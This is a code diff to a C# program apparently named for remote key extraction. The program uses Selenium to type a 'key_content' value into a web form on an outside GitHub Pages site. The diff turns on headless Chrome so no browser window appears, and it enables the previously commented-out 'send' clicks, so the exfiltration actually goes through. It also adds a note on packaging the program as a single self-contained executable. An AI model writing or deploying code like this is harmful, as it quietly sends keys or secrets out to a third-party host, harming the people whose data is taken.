@@ -5,8 +5,12 @@ using System.Threading.Tasks;
 using System.Management.Automation;
 using System.Net.Http;
 using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Firefox;
+
+// https://github.com/PowerShell/PowerShell/issues/7909
+// dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
 
 namespace Remote_Key_Web_Based_Extraction
 {
@@ -84,11 +88,14 @@ namespace Remote_Key_Web_Based_Extraction
             */
             try
             {
+                // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
+                var chromeOptions = new ChromeOptions();
+                chromeOptions.AddArguments("headless");
                 Console.WriteLine("[=] Attempting to try Chrome");
-                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
+                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver(chromeOptions);
                 current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                 current_driver.FindElement(By.Name("message")).SendKeys(key_content);
-                //current_driver.FindElement(By.Name("send")).Click();
+                current_driver.FindElement(By.Name("send")).Click();
                 current_driver.Quit();
             }
             catch (Exception e)
@@ -99,7 +106,7 @@ namespace Remote_Key_Web_Based_Extraction
                 current_drver.Navigate();
                 current_drver.Url = "https://anthony-t-n.github.io/";
                 current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_content);
-                //current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
+                current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                 current_drver.Quit();
             }
             finally
